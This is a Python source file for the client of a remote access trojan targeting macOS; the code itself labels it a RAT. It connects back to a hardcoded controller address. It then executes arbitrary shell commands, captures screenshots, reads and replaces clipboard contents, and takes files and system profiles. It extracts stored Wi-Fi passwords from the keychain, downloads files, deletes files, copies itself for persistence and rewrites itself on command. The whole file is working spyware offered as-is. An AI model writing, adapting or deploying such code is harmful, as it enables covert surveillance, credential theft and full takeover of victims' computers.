import getpass
import os
import socket
import sys
import time

import pyperclip
# import speech_recognition as sr
import subprocess
import base64
import shutil

operating_system = sys.platform
host = "192.168.1.169"
port = 5004
b_size = 999999999
s = socket.socket()
user = getpass.getuser()
sleeptime = 2
cwd = os.getcwd()
version = 2.2
parent = os.path.dirname(cwd)
parent_of_parent = os.path.dirname(parent)
parent_of_parent = parent_of_parent.replace(" ", '\ ')


def persistence():
    try:
        destination = s.recv(b_size).decode()
        full_path = "/Users/" + user + "/" + destination
        s.send(full_path.encode())
        cmd = "cp -R " + parent_of_parent + " " + full_path
        subprocess.Popen(cmd, shell=True)
    except Exception as Error22:
        s.send(str(Error22).encode())


def caffeinate():
    recieved_data = s.recv(b_size).decode()
    subprocess.Popen("caffeinate -t " + str(recieved_data), shell=True)


def uncaffeinate():
    os.system("killall caffeinate")


def soundboard():
    cmd = subprocess.Popen("osascript -e 'output volume of (get volume settings)'", shell=True,
                           stdout=subprocess.PIPE).stdout
    cmd_d = cmd.read()
    s.send(cmd_d)
    data = s.recv(b_size).decode()
    if data == "1":
        os.system("osascript -e 'set volume output volume 0'")
    elif data == "2":
        os.system("osascript -e 'set volume output volume 100'")
    elif data == "3":
        data_r = s.recv(b_size).decode()
        if len(data_r) > 0:
            os.system("osascript -e 'set volume output volume " + data_r + "'")
        elif data_r == "quit":
            pass
    if data == "quit":
        pass


def screenshot():
    try:
        path = '/Users/' + user + "/screenshot.jpg"
        os.system("screencapture -x " + path)
        with open(path, 'rb') as f:
            fdata = base64.b64encode(f.read())
        s.sendall(fdata)
        os.remove(path)
    except Exception as Error23:
        pass


global connected


def connection():
    connected = False
    while not connected:
        try:
            s.connect((host, port))
            connected = True
        except socket.error:
            time.sleep(2)
            os.execl(sys.executable, sys.executable, *sys.argv)


connection()


def wifinfo():
    wifi_info = subprocess.Popen("/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -I",
                                 shell=True, stdout=subprocess.PIPE).stdout
    wifi_info = wifi_info.read()
    s.send(wifi_info)


def wifipass():
    try:
        SSID = subprocess.Popen("/Sy*/L*/Priv*/Apple8*/V*/C*/R*/airport -I | grep SSID", shell=True,
                                stdout=subprocess.PIPE).stdout
        SSID = str(SSID.read())
        SSID = SSID.replace("\\n'", '')
        SSID_Split = SSID.split()
        SSID_Split = SSID_Split[-1]
        s.send(str(SSID_Split).encode())
        password = subprocess.Popen("security find-generic-password -wa " + str(SSID_Split), shell=True,
                                    stdout=subprocess.PIPE).stdout
        password = password.read()
        s.send(str(password).encode())
    except Exception as error:
        s.send(str(error).encode())
        s.send(str(error).encode())


# def speechtext():
#     r = sr.Recognizer()
#     with sr.Microphone() as source:  # use the default microphone as the audio source
#         audio = r.listen(source)  # listen for the first phrase and extract it into audio data
#
#     try:
#         recieved_data = r.recognize_google(audio, language='en')
#         s.send(recieved_data.encode())
#     except LookupError:  # speech is unintelligible
#         s.send(str(LookupError).encode())


def cboard():
    clipboard = pyperclip.paste()
    s.send(str(clipboard).encode())


def chgboard():
    clipboard = pyperclip.paste()
    s.send(str(clipboard).encode())
    received_data = s.recv(b_size).decode()
    pyperclip.copy(received_data)


def sysinfo():
    data_r = s.recv(b_size).decode()
    data_r = str(data_r)
    if data_r == "1":
        hardware_info = subprocess.Popen("system_profiler SPHardwareDataType", shell=True,
                                         stdout=subprocess.PIPE).stdout
        hardware_info = hardware_info.read()
        s.send(hardware_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "2":
        printer_ethernet_info = subprocess.Popen("system_profiler SPEthernetDataType SPPrintersDataType",
                                                 shell=True,
                                                 stdout=subprocess.PIPE).stdout
        printer_ethernet_info = printer_ethernet_info.read()
        s.send(str(printer_ethernet_info).encode())
        subprocess.Popen("clear", shell=True)
    elif data_r == "3":
        network_info = subprocess.Popen("system_profiler SPNetworkDataType", shell=True,
                                        stdout=subprocess.PIPE).stdout
        network_info = network_info.read()
        s.send(network_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "4":
        software_info = subprocess.Popen("system_profiler SPSoftwareDataType", shell=True,
                                         stdout=subprocess.PIPE).stdout
        time.sleep(1)
        software_info = software_info.read()
        s.send(software_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "5":
        accessibility_info = subprocess.Popen("system_profiler SPUniversalAccessDataType", shell=True,
                                              stdout=subprocess.PIPE).stdout
        accessibility_info = accessibility_info.read()
        s.send(accessibility_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "6":
        application_info = subprocess.Popen("system_profiler SPApplicationsDataType", shell=True,
                                            stdout=subprocess.PIPE).stdout
        application_info = application_info.read()
        s.send(application_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "7":
        bluetooth_info = subprocess.Popen("system_profiler SPBluetoothDataType", shell=True,
                                          stdout=subprocess.PIPE).stdout
        bluetooth_info = bluetooth_info.read()
        s.send(bluetooth_info)
        time.sleep(.5)
        subprocess.Popen("clear", shell=True)
    elif data_r == "8":
        hd_info = subprocess.Popen("system_profiler SPNVMeDataType", shell=True,
                                   stdout=subprocess.PIPE).stdout
        hd_info = hd_info.read()
        s.send(hd_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "9":
        power_info = subprocess.Popen("system_profiler SPPowerDataType", shell=True,
                                      stdout=subprocess.PIPE).stdout
        power_info = power_info.read(b_size)
        s.send(power_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "10":
        airport_info = subprocess.Popen("system_profiler SPAirPortDataType", shell=True,
                                        stdout=subprocess.PIPE).stdout
        airport_info = airport_info.read()
        s.send(airport_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "11":
        all_info = subprocess.Popen("system_profiler -detailLevel mini", shell=True,
                                    stdout=subprocess.PIPE).stdout
        all_info = all_info.read(b_size)
        subprocess.Popen("clear", shell=True)
        s.sendall(all_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "12":
        all_info = subprocess.Popen("system_profiler -detailLevel basic", shell=True,
                                    stdout=subprocess.PIPE).stdout
        all_info = all_info.read(b_size)
        subprocess.Popen("clear", shell=True)
        s.sendall(all_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "13":
        all_info = subprocess.Popen("system_profiler -detailLevel full", shell=True,
                                    stdout=subprocess.PIPE).stdout
        all_info = all_info.read()
        subprocess.Popen("clear", shell=True)
        s.sendall(all_info)
        subprocess.Popen("clear", shell=True)
    elif data_r == "quit":
        pass


def livescreen():
    s.send("Currently Not Working".encode())


def dlimage():
    current_working_directory = os.getcwd()
    s.send(current_working_directory.encode())
    url = s.recv(b_size).decode()
    time.sleep(.5)
    file_name = s.recv(b_size).decode()
    file_name1 = "/Users/" + user + "/" + file_name
    file_name_path = file_name1.replace(file_name, '')
    s.send(file_name1.encode())
    os.chdir(file_name_path)
    os.system("curl -o " + file_name + ' ' + url)


def dfile():
    try:
        cwd_files = os.listdir(os.getcwd())
        cwd_files = str(cwd_files)
        s.send(cwd_files.encode())
        data_d = s.recv(b_size)
        data_d = data_d.decode()
        if operating_system == 'win32' and len(data_d) > 0:
            path = "C:/Users/" + user + "/" + data_d
            file = open(path, 'rb')
            data1 = file.read()
            s.send(data1)
        elif operating_system == 'darwin':
            mac_path = "/Users/" + user + "/" + data_d
            file = open(mac_path, 'rb')
            data_r = file.read()
            s.send(data_r)
    except Exception as Error:
        s.send(str(Error).encode())


def operating_sys_vdir():
    try:
        datav = s.recv(b_size).decode().lower()
        mac_path = "/Users/" + user + "/" + datav
        if operating_system == 'darwin':
            if datav == "cwd":
                current_working_dir = os.getcwd()
                cw_d = os.listdir(current_working_dir)
                cw_d = str(cw_d)
                s.send(cw_d.encode())
            else:
                data_s = os.listdir(mac_path)
                data_s = str(data_s)
                s.send(data_s.encode())
    except Exception as error:
        s.send(str(error).encode())


def operating_sys_del():
    r_data = s.recv(b_size).decode().lower()
    mac_path = "/Users/" + user + '/' + r_data
    try:
        os.remove(mac_path)
        s.send(mac_path.encode())
    except Exception as error:
        s.send(str(error).encode())


def sfile():
    try:
        data1 = s.recv(b_size)
        filename = s.recv(b_size)
        new_file = open(filename, "wb")
        new_file.write(data1)
        new_file.close()
    except Exception as error:
        print(str(error))


s.send(user.encode())
while True:
    try:
        command = s.recv(b_size)
        command = command.decode().lower()
        if command == 'quit':
            s.close()
            time.sleep(.5)
            os.execl(sys.executable, sys.executable, *sys.argv)
        elif command == "cwd":
            cwd = os.getcwd()
            cwd = str(cwd)
            s.send(cwd.encode())
        elif command == "del":
            operating_sys_del()
        elif command == "vdir":
            operating_sys_vdir()
        elif command == "dfile":
            dfile()
        elif command == 'sfile':
            sfile()
        elif command == 'os':
            try:
                cmd = s.recv(b_size).decode()
                direct_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                 stdin=subprocess.PIPE)
                direct_output, err = direct_output.communicate()
                if cmd == "quit":
                    pass
                else:
                    if err:
                        err = err.decode().replace("\n", "")
                        s.send(err.encode())
                    else:
                        if len(direct_output) <= 0:
                            s.send("This Command Has No Output".encode())
                        else:
                            s.send(direct_output)
            except Exception as e:
                s.send(str(e).encode())
                pass
        elif command == 'cd':
            try:
                data = s.recv(b_size)
                data = data.decode()
                if operating_system == 'darwin':
                    fpath = "/Users/" + user + "/" + data
                    os.chdir(fpath)
                    path_s = "Changed Directory To: " + fpath
                    s.send(path_s.encode())
                elif operating_system == 'win32':
                    fpath = "C:/Users/" + user + "/" + data
                    os.chdir(fpath)
                    path_s = "Changed Directory To: " + fpath
                    s.send(path_s.encode())
            except Exception as e:
                s.send(str(e).encode())
        elif command == "live":
            livescreen()
        elif command == "sysinfo":
            sysinfo()
        elif command == "cboard":
            cboard()
        elif command == "chgboard":
            chgboard()
        # elif command == "speechtext":
        #     speechtext()
        elif command == "getwifi":
            wifipass()
        elif command == "wifinfo":
            wifinfo()
        elif command == "exit":
            s.close()
            time.sleep(.5)
            quit()
        elif command == "dlimage":
            dlimage()
        elif command == "restart":
            s.close()
            time.sleep(.5)
            os.execl(sys.executable, sys.executable, *sys.argv)
        elif command == "processlist":
            try:
                cmd = subprocess.Popen("ps -ax", shell=True, stdout=subprocess.PIPE).stdout
                cmd = cmd.read()
                s.send(cmd)
            except Exception as Error:
                Error = str(Error)
                s.send(Error.encode())
        elif command == "remove rat":
            cwd = os.getcwd()
            parent = os.path.dirname(cwd)
            parent_of_parent = os.path.dirname(parent)
            s.send(parent_of_parent.encode())
            s.close()
            shutil.rmtree(parent_of_parent)
            quit()
        elif command == "screenshot":
            screenshot()
        elif command == "soundboard":
            soundboard()
        elif command == "caffeinate":
            caffeinate()
        elif command == "uncaffeinate":
            uncaffeinate()
        elif command == "persist":
            persistence()
        elif command == "update":
            try:
                data = s.recv(b_size).decode()
                print(data)
                self_content = open(__file__).write(data)
            except Exception as Error32:
                print(Error32)
        elif command == "test":
            os.system("say test worked")
        else:
            s.close()
            connection()
    except Exception as Error15:
        connection()
        pass
